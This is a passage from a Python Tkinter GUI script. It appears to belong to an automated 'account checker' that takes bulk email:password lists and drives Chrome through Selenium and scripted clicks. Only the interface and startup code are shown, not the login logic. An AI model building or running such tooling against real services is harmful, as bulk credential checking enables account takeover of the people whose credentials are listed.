    listbox_chromedriver_args, "List of current Chromedriver arguments."
)

ttk.Button(
    frame_chromedriver,
    text="Remove Selected Argument(s)",
    command=remove_chromedriver_argument,
).grid(column=1, row=2, padx=10, pady=5, sticky="w")
CreateToolTip(
    frame_chromedriver.children["!button2"],
    "Remove the selected Chromedriver argument(s).",
)

ttk.Label(frame_chromedriver, text="Find more Chromium Command-Line Switches:").grid(
    column=0, row=3, padx=10, pady=10, sticky="e"
)
help_link = tk.Label(
    frame_chromedriver,
    text="https://peter.sh/experiments/chromium-command-line-switches/",
    foreground="blue",
    cursor="hand2",
)
help_link.grid(column=1, row=3, padx=10, pady=10, sticky="w")
help_link.bind(
    "<Button-1>",
    lambda e: webbrowser.open(
        "https://peter.sh/experiments/chromium-command-line-switches/"
    ),
)
CreateToolTip(help_link, "Open Chromium Command-Line Switches in your browser.")

# --- Mouse Click Automation Tab ---
frame_mouse_clicks_tab = ttk.Frame(notebook)
notebook.add(frame_mouse_clicks_tab, text="OPTIONAL: Mouse Click Automation")

chk_enable_mouse_clicks = ttk.Checkbutton(
    frame_mouse_clicks_tab,
    text="Enable Mouse Click Automation",
    variable=var_enable_mouse_clicks,
)
chk_enable_mouse_clicks.grid(column=0, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(
    chk_enable_mouse_clicks,
    "Enable to automate mouse clicks at specified coordinates or CSS selectors.",
)

# Coordinate Clicks Section
ttk.Label(frame_mouse_clicks_tab, text="Coordinate-based Clicks:").grid(column=0, row=1, padx=10, pady=5, sticky="w")

frame_mouse_clicks = ttk.Frame(frame_mouse_clicks_tab)
frame_mouse_clicks.grid(column=0, row=2, padx=10, pady=5, sticky="w")

ttk.Button(
    frame_mouse_clicks_tab,
    text="+ Add Click Action",
    command=add_mouse_click_action_extended,
).grid(column=0, row=3, padx=10, pady=5, sticky="w")
CreateToolTip(
    frame_mouse_clicks_tab.children["!button"], "Add a new mouse click action."
)

# CSS Selector Clicks Section
ttk.Label(frame_mouse_clicks_tab, text="CSS Selector-based Clicks:").grid(column=0, row=4, padx=10, pady=10, sticky="w")

frame_css_clicks = ttk.Frame(frame_mouse_clicks_tab)
frame_css_clicks.grid(column=0, row=5, padx=10, pady=5, sticky="w")

ttk.Button(
    frame_mouse_clicks_tab,
    text="+ Add CSS Selector Click Action",
    command=add_css_click_action,
).grid(column=0, row=6, padx=10, pady=5, sticky="w")
CreateToolTip(
    frame_mouse_clicks_tab.children["!button2"], "Add a new CSS selector click action."
)

# --- Configuration Menu Tab ---
frame_config = ttk.Frame(notebook)
notebook.add(frame_config, text="Configuration Menu")

ttk.Button(
    frame_config,
    text="Create New Config",
    command=create_config,
).grid(column=0, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(frame_config.children["!button"], "Create a new configuration file.")

ttk.Button(
    frame_config,
    text="Import Config",
    command=import_config,
).grid(column=0, row=1, padx=10, pady=5, sticky="w")
CreateToolTip(frame_config.children["!button2"], "Import an existing configuration file.")

ttk.Button(
    frame_config,
    text="Export Config",
    command=export_config,
).grid(column=0, row=2, padx=10, pady=5, sticky="w")
CreateToolTip(frame_config.children["!button3"], "Export the current configuration to a file.")

ttk.Button(
    frame_config,
    text="Save Config State",
    command=save_config_state,
).grid(column=0, row=3, padx=10, pady=5, sticky="w")
CreateToolTip(frame_config.children["!button4"], "Save the current configuration state.")

ttk.Button(
    frame_config,
    text="Reset to Default",
    command=reset_to_default,
).grid(column=0, row=4, padx=10, pady=5, sticky="w")
CreateToolTip(
    frame_config.children["!button5"], "Reset all settings to their default values."
)

# -------------------
# Account Inputs and Actions
# -------------------
frame_actions = ttk.LabelFrame(window, text="Account Inputs")
frame_actions.pack(padx=10, pady=10, fill="both", expand=True)

ttk.Label(
    frame_actions,
    text="Enter Usernames and Passwords (one per line, format: email:password):",
).pack(padx=10, pady=(10, 5), anchor="w")

text_usernames_passwords = tk.Text(frame_actions, height=10, width=150)
text_usernames_passwords.pack(padx=10, pady=5, fill="both", expand=True)

# Control Buttons Frame
frame_control_buttons = ttk.Frame(frame_actions)
frame_control_buttons.pack(padx=10, pady=10, anchor="e")

# Pause/Resume Button
btn_pause_resume = ttk.Button(
    frame_control_buttons, text="Pause", command=pause_resume
)
btn_pause_resume.grid(column=0, row=0, padx=5, pady=5)
CreateToolTip(
    btn_pause_resume,
    "Pause to Enter CONFIG Mode or resume the account checking process.",
)

# Force Stop Button
btn_force_stop = ttk.Button(
    frame_control_buttons,
    text="Force Stop",
    command=force_stop,
    state=tk.DISABLED,
)
btn_force_stop.grid(column=1, row=0, padx=5, pady=5)
CreateToolTip(
    btn_force_stop, "Forcefully STOP the ENTIRE account checking process."
)

# Check Accounts Button
btn_check_accounts = ttk.Button(
    frame_actions, text="Check Accounts", command=gui_check_accounts
)
btn_check_accounts.pack(padx=10, pady=10, anchor="e")
CreateToolTip(btn_check_accounts, "Start checking the entered accounts.")

if __name__ == "__main__":
    try:
        # Initial setup
        update_pip()
        check_python_version()

        required_packages = [
            "colorama",
            "selenium",
            "requests",
            "chromedriver-autoinstaller",
            "Pillow",
            "pyautogui",
        ]
        check_and_install_packages(required_packages)

        # Close any existing Chrome processes
        force_close_chrome_processes()

        # Load previous settings
        load_settings()

        # Set window close protocol
        window.protocol("WM_DELETE_WINDOW", on_closing)

        # Start the profile selection before the GUI loop
        select_profile()

        # Set up the database if enabled
        setup_database(db_name)

        # Start the main GUI loop
        window.mainloop()
    except Exception as e:
        print_action(f"{Fore.RED}An unexpected error occurred: {e}{Style.RESET_ALL}")
        sys.exit(1)
